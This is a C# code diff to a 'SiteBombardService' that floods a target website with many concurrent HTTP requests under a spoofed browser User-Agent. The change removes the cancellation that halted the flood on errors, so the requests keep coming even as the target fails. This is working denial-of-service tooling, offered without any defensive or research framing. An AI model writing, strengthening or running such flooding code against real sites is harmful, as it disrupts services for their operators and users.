@@ -20,20 +20,18 @@ public class SiteBombardService : ISiteBombardService
 
     public async Task BombardAsync(string siteUrl, ILogger logger)
     {
-        var cancellationTokenSource = new CancellationTokenSource();
-
         var list = new List<Task>(IterationsCount);
 
         var client = _httpClientFactory.CreateClient("sites");
 
         for (var i = 0; i < IterationsCount; i++)
         {
-            list.Add(MakeRequestAsync(siteUrl, logger, client, cancellationTokenSource.Token, () => cancellationTokenSource.Cancel()));
+            list.Add(MakeRequestAsync(siteUrl, logger, client));
         }
 
         await Task.WhenAll(list);
     }
-    private static async Task MakeRequestAsync(string siteUrl, ILogger logger, HttpMessageInvoker client, CancellationToken cancellationToken, Action cancelAction)
+    private static async Task MakeRequestAsync(string siteUrl, ILogger logger, HttpMessageInvoker client)
     {
         try
         {
@@ -44,17 +42,11 @@ public class SiteBombardService : ISiteBombardService
             request.Headers.TryAddWithoutValidation("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36");
             request.Headers.TryAddWithoutValidation("Accept-Charset", "ISO-8859-1");
             
-            var result = await client.SendAsync(request, cancellationToken);
-
-            if (!result.IsSuccessStatusCode)
-            {
-                cancelAction.Invoke();
-            }
+            var result = await client.SendAsync(request, CancellationToken.None);
         }
         catch (Exception e)
         {
             logger.LogError(e, $@"exception on: {siteUrl}. message: {e.Message}");
-            cancelAction.Invoke();
         }
     }
 }
